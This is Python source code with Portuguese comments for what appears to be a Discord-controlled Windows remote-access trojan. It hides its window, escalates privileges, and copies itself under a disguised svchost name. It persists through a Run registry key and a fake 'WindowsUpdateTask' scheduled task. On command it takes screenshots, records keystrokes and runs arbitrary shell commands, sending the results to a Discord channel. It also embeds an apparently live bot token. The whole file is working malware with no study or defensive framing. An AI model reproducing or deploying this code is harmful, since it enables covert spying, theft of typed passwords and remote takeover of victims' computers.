import os
import subprocess
import time
import sys
import ctypes
import threading
import discord
import io
import shutil
import winreg
from discord.ext import commands

# --- CONFIGURAÇÕES ---
TOKEN = "MTQ2MTQ3Mzc1NjMwNzI2MzY1OQ.G3vmJ8.zh-HsCINIrF-J2-8UxWYQfeRE3q8cjf61VoPNI"
CANAL_ID = 1461474555032895723

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
log_teclado = ""
gravando = False

# --- PERSISTÊNCIA BRUTAL (ANTI-REBOOT) ---
def blindar():
    try:
        appdata = os.getenv('APPDATA')
        pasta = os.path.join(appdata, "WindowsHost")
        if not os.path.exists(pasta): os.makedirs(pasta)
        exe_f = os.path.join(pasta, "svchost_win.exe")
        
        if os.path.abspath(sys.executable) != os.path.abspath(exe_f):
            shutil.copy2(sys.executable, exe_f)
            ctypes.windll.kernel32.SetFileAttributesW(exe_f, 2)

        # Registro Run
        r = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(r, "WinHostService", 0, winreg.REG_SZ, f'"{exe_f}"')
        
        # Tarefa Agendada para o Reboot
        cmd_t = f'schtasks /create /f /sc onlogon /rl highest /tn "WindowsUpdateTask" /tr "\'{exe_f}\'"'
        subprocess.run(cmd_t, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)
    except: pass

# --- FUNÇÕES DE CAPTURA ---
def pegar_tela():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab(all_screens=True).convert("RGB")
        b = io.BytesIO(); img.save(b, "JPEG", quality=70); b.seek(0)
        return b
    except: return None

def ao_pressionar(key):
    global log_teclado
    if gravando:
        try: log_teclado += str(key.char)
        except: log_teclado += f" [{str(key)}] "

@bot.event
async def on_ready():
    try:
        win = ctypes.windll.kernel32.GetConsoleWindow()
        if win: ctypes.windll.user32.ShowWindow(win, 0)
        c = bot.get_channel(CANAL_ID)
        if c: await c.send(f"Ω AGENTE ONLINE | {os.getlogin()} | PRONTO")
    except: pass

@bot.event
async def on_message(msg):
    global gravando, log_teclado
    if msg.author == bot.user or msg.channel.id != CANAL_ID: return
    
    cmd = msg.content.strip()

    # [1] PRINT EM TODOS
    if cmd == "1":
        f = pegar_tela()
        if f: await msg.channel.send(f"TELA DE {os.getlogin()}:", file=discord.File(f, "t.jpg"))

    # [2] INICIAR KEYLOGGER
    elif cmd == "2":
        gravando = True
        log_teclado = f"--- LOG {os.getlogin()} ---\n"
        await msg.channel.send(f"[*] Gravação iniciada em {os.getlogin()}")

    # [3] SAIR E MANDAR LOG
    elif cmd == "3":
        gravando = False
        if log_teclado:
            await msg.channel.send(f"LOG DE {os.getlogin()}:", file=discord.File(io.BytesIO(log_teclado.encode()), "k.txt"))
            log_teclado = ""

    # [4] COMANDO MANUAL (Ex: 4 dir)
    elif cmd.startswith("4 "):
        sh = cmd.replace("4 ", "")
        try:
            p = subprocess.Popen(sh, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
            res = (p.stdout.read() + p.stderr.read()).decode('cp1252', errors='replace')
            await msg.channel.send(f"RES {os.getlogin()}:\n{res if res else 'Ok'}")
        except: pass

if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        try: ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, None, None, 0); sys.exit()
        except: pass
    
    blindar()
    
    try:
        from pynput import keyboard
        l = keyboard.Listener(on_press=ao_pressionar); l.daemon = True; l.start()
    except: pass

    while True:
        try: bot.run(TOKEN)
        except: time.sleep(15) 